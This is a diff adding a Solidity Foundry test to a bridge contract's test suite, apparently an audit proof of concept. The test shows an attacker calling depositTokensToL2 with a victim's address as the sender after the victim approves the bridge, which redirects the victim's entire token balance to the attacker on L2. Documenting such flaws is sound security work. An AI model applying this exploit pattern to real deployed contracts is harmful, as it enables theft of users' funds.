@@ -223,4 +223,32 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function test_CanMove_ApprovedTokensOf_OtherUsers() public {
+        // 1. Alice will approve the bridge
+        // 2. Bob maliciously call the `depositTokensToL2` before alice
+        // using the params (from -> alice, l2Recipient -> bob, amount -> entire balance of `alice`)
+        // 3. After bob calls this function, `Deposit` event will be triggered.
+        // with following params (from -> alice, l2Recipient -> bob, amount -> entire balance of `alice` )
+        // Note: after an event in emitted, a centralized node will mint the tokens in L2 for `l2Recipient`
+        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob` instead of `alice`.
+        // 5. from L2 bob can withdraw the tokens.
+
+        // poor alice approving
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        vm.stopPrank();
+
+        // Bob takes over
+        uint256 depositAmount = token.balanceOf(user); // user -> alice
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+    }
 }
